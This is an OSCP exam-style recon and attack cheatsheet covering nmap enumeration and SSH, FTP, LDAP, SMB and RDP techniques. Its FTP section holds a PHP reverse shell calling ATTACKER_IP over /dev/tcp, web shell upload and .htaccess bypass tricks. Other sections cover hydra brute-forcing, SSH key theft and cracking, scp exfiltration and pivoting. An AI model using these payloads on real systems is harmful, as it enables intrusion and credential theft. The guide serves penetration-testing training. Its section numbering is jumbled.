Recon & Enumeration Cheatsheet (OSCP Style)

1. Nmap Quick Scan (First Look + Unknown Ports Handling)
sudo nmap -p- --open --min-rate 1000 -sS -n -Pn target_ip -oN openPorts

nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) target_ip -oN services

What you do:

  • Identify full attack surface (ALL open ports, not just web)
  • Flag unusual/high ports (3000–9999 range especially)
  • Detect unknown services early (cgms?, ppp?, nessus?, etc.)

OSCP mindset: Every open port is a potential entry point. High or unknown ports are NOT secondary—they are often primary entry vectors.

Step 2: Service Enumeration (Nmap Deep Scan)

# Service detection + scripts
nmap -sC -sV -p- target_ip -oN services

# Focused scan on found ports
nmap -sC -sV -p port1,port2,port3 target_ip -oN focused

# Version detection
nmap -sV --version-all -p port target_ip

# Aggressive detection
nmap -A -p port target_ip

# Version + probe trace (useful for unknown services)
nmap -sV --version-all --version-trace -p port target_ip

Step 3: Banner Grabbing (Manual Verification)

# TCP banner
nc -nv target_ip port

# HTTP check
curl -v http://target_ip:port
curl -v https://target_ip:port

# TLS services
openssl s_client -connect target_ip:port

# Raw HTTP probe
printf "GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n" | nc target_ip port

Unknown / Rare Port Handling (CRITICAL STEP)

DO NOT search exploits yet. First identify protocol.

# Basic probing
echo "help" | nc target_ip port
echo "version" | nc target_ip port
echo "status" | nc target_ip port
echo "test" | nc target_ip port
echo "A" | nc target_ip port

# Case sensitivity
echo "STATUS" | nc target_ip port
echo "status" | nc target_ip port

# Nmap probing helpers
nmap --script=banner -p port target_ip
nmap -sC -sV -p port target_ip
nmap -A -p port target_ip
nmap -sV --version-intensity 9 -p port target_ip
nmap -sV --version-all -p port target_ip
nmap -sV --version-all -p port target_ip
nmap -sV --version-trace -p port target_ip

Golden Rules (OSCP Exam Logic)

  • Never ignore unknown ports (3003 was your real entry point)
  • Never search exploits before identifying the service
  • Never rely only on Nmap fingerprinting
  • Always interact manually with unknown services

Core principle: Enumeration is active probing, not passive scanning.

2. SSH Enumeration & Attacks (OSCP → Access, Keys & Pivoting)
nmap -p 22 -sV -sC -Pn target_ip -oN ssh_scan

What you do:

  • Identify SSH version (OpenSSH, Dropbear, etc.)
  • Check for weak configurations or outdated versions
  • Determine allowed authentication methods (password, key, keyboard-interactive)
  • Check if root login is enabled or restricted

Authentication method discovery:

nmap --script ssh-auth-methods -p 22 target_ip

Banner grabbing (manual recon):

nc target_ip 22

Brute force attack (OSCP classic - only when needed)


hydra -l root -P rockyou.txt ssh://target_ip

hydra -L users.txt -P rockyou.txt ssh://target_ip

Credential reuse (VERY IMPORTANT in OSCP)

  • Re-test FTP / web / SMB credentials on SSH
  • Try usernames found in config files or FTP leaks
  • Test weak passwords from `.ini`, `.uac`, `.bak` files
ssh user@target_ip

SSH key-based access (HIGH VALUE VECTOR)

  • Search for exposed private keys in backups, FTP, web apps
  • Check /home, /root, /var/www, git repos, archives
  • Keys are often reused across multiple machines

find / -name "id_rsa" 2>/dev/null

ls -la /home/*/.ssh/
ls -la /root/.ssh/

Using a discovered private key:


chmod 600 id_rsa

ssh -i id_rsa user@target_ip

Safe SSH private key format note (no leakage in HTML)


// Example structure (DO NOT EXECUTE)
-----BEGIN OPENSSH PRIVATE KEY-----
...key content...
-----END OPENSSH PRIVATE KEY-----

Cracking SSH key passphrase (if protected)


ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

If SSH login fails:

  • Incorrect username (most common issue)
  • Key requires passphrase
  • Account restrictions (AllowUsers / Fail2Ban)
  • Key not authorized on target

SSH agent abuse (advanced OSCP technique)

  • Agent forwarding may expose reused keys
  • Keys loaded in memory can allow lateral movement
ssh -A user@target_ip

Port forwarding (critical OSCP pivoting skill)

Local port forwarding:

ssh -L 8080:127.0.0.1:80 user@target_ip

Dynamic SOCKS proxy (pivot network access):

ssh -D 9050 user@target_ip

Remote port forwarding (reverse pivot):

ssh -R 4444:localhost:4444 user@target_ip

File exfiltration (post-exploitation)

scp user@target_ip:/home/user/.ssh/id_rsa .

SSH tunneling mindset (OSCP critical)

  • SSH is often NOT the entry point
  • It is a post-exploitation pivoting tool
  • Used to access internal services (DBs, web apps, SMB)

Common SSH attack paths in OSCP

  • FTP/web leak → credentials → SSH login
  • Backup files → id_rsa → direct shell access
  • Internal pivot → SSH tunneling → hidden services
  • Password reuse → quick privilege escalation

OSCP mindset

  • SSH is rarely vulnerable directly
  • It is a privilege escalation or pivoting tool
  • Always think: “what credentials or keys can I reuse?”
3. FTP Enumeration & Attacks (OSCP → Recon to RCE Chain)
nmap -p 21 -sV -sC -Pn target_ip -oN ftp_scan

What you do:

  • Identify FTP service (vsftpd, ProFTPD, FileZilla, zFTPServer)
  • Check anonymous login access
  • Enumerate writable directories and shared paths
  • Correlate FTP paths with web root or SMB shares

Anonymous login test:

ftp target_ip
anonymous:anonymous
nmap --script ftp-anon -p 21 target_ip

Directory enumeration / file discovery:

  • Look for backups (.zip, .tar, .bak, .sql)
  • Search config files (credentials, SSH keys, API keys)
  • Check for web directories (/www, /html, /htdocs, inetpub)

Download all files (OSCP recon habit):

wget -m ftp://anonymous:anonymous@target_ip

Brute force FTP credentials:

hydra -L users.txt -P rockyou.txt ftp://target_ip

Writable FTP abuse → Web Shell Upload (PRIMARY RCE PATH)

  • If FTP directory is inside web root → upload web shell
  • Access uploaded file via HTTP to execute code

# Upload PHP web shell
put shell.php

# Then trigger via browser
http://target_ip/uploads/shell.php

Safe PHP reverse shell template (HTML escaped)


// PHP reverse shell (safe HTML version)

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>

Listener setup:

nc -lvnp 4444

Alternative FTP → RCE techniques

  • 1. File rename execution → upload non-executable then rename to .php/.aspx
  • 2. LFI + log/file poisoning → inject PHP into writable file then include via LFI
  • 3. .htaccess abuse (Apache) → force execution of uploaded files

# Rename trick (if allowed)
put shell.txt
rename shell.txt shell.php
        

# .htaccess payload (Apache environments)
AddType application/x-httpd-php .txt

vsftpd / ProFTPD common CVEs:

  • Check version via nmap or banner grabbing
  • Search exploit-db / searchsploit
  • Look for backdoors (e.g. vsftpd 2.3.4 infamous backdoor)

OSCP mindset (critical)

  • FTP is NOT usually direct RCE → it's a pivot service
  • Highest value = writable directories + config leaks
  • Always correlate FTP structure with web/SMB services
  • FTP often leads to: web shell → creds → privilege escalation
2. Full TCP Scan (All Ports)
nmap -p- -T4 -Pn -n target_ip -oN full_ports.txt
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) target_ip -oN services

What you want:

  • Service versions (for exploits)
  • Authentication boundaries (SMB, LDAP, WinRM)
  • High-value targets (AD, DBs, web panels)
3. UDP Scan (If Time Allows)
nmap -sU --top-ports 50 target_ip

Use when: TCP gives nothing interesting or box feels “incomplete”.

10. Port 389 - LDAP (Directory Enumeration)

Objective: Extract directory information (users, structure, configs, creds if exposed).

1. Base discovery

ldapsearch -x -H ldap://target_ip -s base

Goal: identify base naming context

2. Basic enumeration

ldapsearch -x -H ldap://target_ip -b "DC=domain,DC=local"

Look for:

  • Users
  • Groups
  • Machines
  • Descriptions / notes

3. User extraction

ldapsearch -x -H ldap://target_ip \
-b "DC=domain,DC=local" \
"(objectClass=user)"

Use for:

  • Password spraying
  • Authentication attacks

4. Credential hunting

ldapsearch -x -H ldap://target_ip -b "DC=domain,DC=local" | grep -i password

Typical leaks:

  • User descriptions
  • Service account notes
  • Legacy configuration data

5. Authenticated enumeration

ldapsearch -x -H ldap://target_ip \
-D "user@domain.local" \
-w "password" \
-b "DC=domain,DC=local"

What changes:

  • More objects become visible
  • Restricted attributes may unlock

6. High value data (if present)

  • Computer attributes
  • Service accounts
  • Potential LAPS / password fields

7. OSCP mindset

  • LDAP = structured information leak
  • Always pivot to other services after enumeration
  • Rarely the exploit → mostly a discovery tool
11. Port 3389 - RDP
xfreerdp /u:user /p:password /v:target_ip
8. Port 139/445 - SMB (General Enumeration)

Objective: Identify shares, misconfigurations, and possible credential exposure.

1. Initial check

smbclient -L //target_ip -N
smbmap -H target_ip

What you want:

  • Anonymous access
  • Readable shares
  • Writable shares

2. Share exploration

smbclient //target_ip/share -N

Look for:

  • Configs (.conf, .ini)
  • Backups (.bak, .old)
  • Scripts (.ps1, .bat, .sh)
  • Credentials in plain text

3. Recursive listing

smbclient //target_ip/share -N -c "recurse ON; prompt OFF; ls"

Goal: map full share structure

4. Writable shares

If writable:

  • Upload files
  • Test execution paths (web / scripts / services)
  • Drop payloads if execution exists
put file.txt

5. Credential hunting

grep -R "password" .
find . -type f -name "*.config"
find . -type f -name "*.txt"

6. OSCP mindset

  • SMB = file-based attack surface
  • Always check before web brute force
  • Most creds in labs come from files
13. Credential Hunting
grep -R "password" .
find / -name "*.conf" 2>/dev/null

OSCP mindset: creds always exist somewhere → never assume clean environment.
